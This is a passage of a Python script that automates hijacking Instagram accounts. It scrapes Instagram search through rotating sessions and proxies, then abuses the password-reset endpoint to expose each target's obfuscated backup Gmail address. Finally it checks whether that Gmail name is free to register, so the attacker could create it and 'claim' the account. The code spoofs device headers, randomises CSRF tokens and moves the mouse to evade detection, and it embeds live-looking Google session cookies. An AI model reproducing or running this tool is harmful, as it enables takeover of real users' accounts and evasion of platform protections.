        }
        return requests.get('https://www.instagram.com/api/v1/web/search/topsearch/', params=params, cookies=cookies, headers=headers, proxies=proxies(i+30))#, proxies=proxys)
        

    test_letters = letters #if name[-1] not in letters else 'lnstrdhm'[:len(letters)]
    results = []
    for letter in test_letters:
        while pause[0]:
            print(f"Pausing on {name} + {letter}")
            time.sleep(10)
        response = search_response(name + letter, i)
        if response.status_code != 200: 
            pause[0] = True
            print("INVALID Session", i, response.text)
            time.sleep(100*random.random())
            reset_session_ids()
            print(session_ids)
            pause[0] = False
        else:
            # print(response.text)
            json = response.json()
            print(name+letter, response, len(json['users']))
            
            # if len(json['users']) >= 3 and random.randint(0,2) == 1:
            #     print("Emulating page click...")
            #     user = json['users'][random.randint(0, 2)]['user']
            #     id = user['pk']
            #     username = user['username']
            #     click_search1(id, i)
            #     click_search2(id, i)
            #     click_search3(username, i)

            # import pprint
            # pp = pprint.PrettyPrinter(depth=6)
            for user in json['users']:
                full_name = user['user']['full_name']
                if full_name == name:
                    username = user['user']['username']
                    if username not in results: results.append(username)

        if letter != test_letters[-1]: time.sleep(9 + random.random()*6)
    return results

## Step 2
def backup_email(m_resps, name, tries = 0): ## Find their backup email. 200 if email given, 400 if couldn't reset, 429 if rate limit. We want 200s with gmail with matching first and last chars with username
    # i = random.choice(proxy_nums)
    # proxy = proxies(i)
    if tries == 3: return False
    data = {
        "_csrftoken":
        "".join(
            random.choices(string.ascii_lowercase +
                        string.ascii_uppercase + string.digits,
                        k=32)),
        "username":
        name,
        "guid":
        uuid.uuid4(),
        "device_id":
        uuid.uuid4()
    }
    head = {
        "user-agent":
        f"Instagram 150.0.0.0.000 Android (29/10; 300dpi; 720x1440; {''.join(random.choices(string.ascii_lowercase+string.digits, k=16))}/{''.join(random.choices(string.ascii_lowercase+string.digits, k=16))}; {''.join(random.choices(string.ascii_lowercase+string.digits, k=16))}; {''.join(random.choices(string.ascii_lowercase+string.digits, k=16))}; {''.join(random.choices(string.ascii_lowercase+string.digits, k=16))}; en_GB;)"
    }
    try:
        response = requests.post(
            "https://i.instagram.com/api/v1/accounts/send_password_reset/",
            headers=head,
            data=data,
            proxies=proxys)
    except:
        return backup_email(m_resps, name, tries = tries+1)
    print(response, name, response.text)
    text = response.text
    # print(text)
    if "obfuscated_email" not in text: return False
    if "@gmail.com" not in text: return False

    email_username = text.split("@gmail.com")[0].replace(' ', '\"').split("\"")[-1]
    print(email_username)
    if (name[0] == email_username[0] and name[-1] == email_username[-1]):
        m_resps.append(name)
        return True
    return False

## Step 3
def available_gmail(m_resps, name): ## Check given name/username is available on gmail to create the gmail account
    # proxy = proxies(random.choice(proxy_nums))
    cookies = {
        '__Host-GAPS': '1:u9G0T0rTyo3Vt0MVCQWCPGwHZg1jkg:lzk1XvQz-Fy_P6bN',
        'NID': '511=a_B-kDofGjI39gYhy7cOXSQLbTJccMY1xGCuKVOdS_OwAbd9n2vwypzTQUZF04Wa4KthM58PU-x6OsvLea9PEMHSx23WPNIVvYEd9y4uYsx2hQK9CCEkKE76xfsBWR36YIvnEswvjUVIe-L1DkMmXFlmAQt5h0LnXeIRWdomNEs',
    }

    headers = {
        'authority': 'accounts.google.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
        # 'cookie': '__Host-GAPS=1:u9G0T0rTyo3Vt0MVCQWCPGwHZg1jkg:lzk1XvQz-Fy_P6bN; NID=511=a_B-kDofGjI39gYhy7cOXSQLbTJccMY1xGCuKVOdS_OwAbd9n2vwypzTQUZF04Wa4KthM58PU-x6OsvLea9PEMHSx23WPNIVvYEd9y4uYsx2hQK9CCEkKE76xfsBWR36YIvnEswvjUVIe-L1DkMmXFlmAQt5h0LnXeIRWdomNEs',
        'google-accounts-xsrf': '1',
        'origin': 'https://accounts.google.com',
        'referer': 'https://accounts.google.com/signup/v2/webcreateaccount?flowName=GlifWebSignIn&flowEntry=SignUp',
        'sec-ch-ua': '"Chromium";v="112", "Google Chrome";v="112", "Not:A-Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"macOS"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
        'x-same-domain': '1',
    }

    params = {
        'hl': 'en-GB',
        '_reqid': '51985',
        'rt': 'j',
    }

    data = f'continue=https%3A%2F%2Faccounts.google.com%2FManageAccount%3Fnc%3D1&f.req=%5B%22AEThLlxPgLeF9X4pDr0D6HC7KYZgzTFnmV0-erEVDU1R4DQQ4ryr_Z218-xeOyAo7x1cg_kp4tRQF3fXIjeT9fAp3za2ceyziD5rxneyv_5R9Sp7GibBlN-vSjZwZ8GKGQuse1uTf3970ZkTn4KpYac3ri-j91WNYoAnyWjWePD1_7dTwzLY-DFHQqMw_bkmx0MSTyxBklVTJxtDrSzbRbcgdYcM_SoJpg%22%2C%22%22%2C%22%22%2C%22'
    data += f'{name}%22%2Ctrue%2C%22S269319110%3A1682447165729799%22%2C1%5D&azt=AFoagUUkPZtfm6zlIVbcze0GgJC1A6J80g%3A1682447165751&cookiesDisabled=false&deviceinfo=%5Bnull%2Cnull%2Cnull%2C%5B%5D%2Cnull%2C%22SG%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22%2Cnull%2C%5Bnull%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C%5B%5D%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C1%2Cnull%2Cfalse%2C1%2C%22%22%2Cnull%2Cnull%2C1%5D&gmscoreversion=undefined&'

    response = requests.post(
        'https://accounts.google.com/_/signup/webusernameavailability',
        params=params,
        cookies=cookies,
        headers=headers,
        data=data,
        # proxies=proxys
    )
    text = response.text
    print(text)
    num = text[text.index("\",")+2]
    # print(num)
    if str(num) == str(1): m_resps.append(name)

## Aggregate steps 1,2,3
def find_all_valids(m_resps, pause, name, i): ## For a given name like ullivan, find all 2013 type accounts that we could create gmails for and claim
    potential_accounts = find_all(name, pause, i)
    print('potential_accounts', len(potential_accounts), potential_accounts)

    def runInParallel_backup(names):
        with Manager() as manager:
            m_resps = manager.list()
            proc = []
            for name in names:
                p = Process(target=backup_email, args=(m_resps, name))
                proc.append(p)
                p.start()
            for p in proc:
                p.join()
            return list(m_resps)

    gmail_backed = runInParallel_backup(potential_accounts)
    print('gmail_backed', gmail_backed)

    def runInParallel_gmail(names):
        with Manager() as manager:
            m_resps = manager.list()
            proc = []
            for name in names:
                p = Process(target=available_gmail, args=(m_resps, name))
                proc.append(p)
                p.start()
                time.sleep(0.4)
            for p in proc:
                p.join()
            return list(m_resps)
        
    valid_accounts = runInParallel_gmail(gmail_backed)
    print(f"Valid accounts for {name}: ", valid_accounts)
    
    m_resps += valid_accounts
    return valid_accounts

## Run Aggregated steps 1,2,3 in parallel
def runInParallel(names): ## Find all valids running for many names synchronously
    reset_session_ids()
    print(session_ids)
    with Manager() as manager:
        m_resps = manager.list()
        pause = manager.list()
        pause.append(False)
        proc = []
        i = 0
        for name in names:
            while(pause[0]):
                time.sleep(10)
            pyautogui.moveTo(500 + random.randint(0, 100), 500 + random.randint(0, 100))
            p = Process(target=find_all_valids, args=(m_resps, pause, name, i))
            proc.append(p)
            p.start()
            i = (i + 1) % len(session_ids)
            time.sleep(20 * len(letters) / len(session_ids))
        for p in proc:
            p.join()
        # print("ALL VALID: ", list(m_resps))
        # for name in list(m_resps):
        #     print(name)
        return list(m_resps)

start = time.time()
all_valids = ['akailaleflore196798', 'auricionow']
for i in range(1, 200):
    names_to_run = names[3*i:3*(i+1)]
    all_valids += runInParallel(names_to_run)
    print(i, "ALL VALIDS: ", all_valids)
    print("PAUSING FOR NEXT SET")
    time.sleep(100)
end = time.time()
print(end - start)